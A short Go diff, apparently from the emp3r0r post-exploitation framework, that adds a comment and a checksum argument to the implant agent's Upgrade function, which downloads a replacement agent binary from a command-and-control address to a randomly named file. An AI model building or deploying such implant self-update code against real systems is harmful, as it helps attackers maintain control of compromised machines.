@@ -149,9 +149,10 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	return &info
 }
 
+// Upgrade agent from https://ccAddress/agent
 func Upgrade(checksum string) (out string) {
 	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
-	_, err := SmartDownload("agent", tempfile)
+	_, err := SmartDownload("agent", tempfile, checksum)
 	if err != nil {
 		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
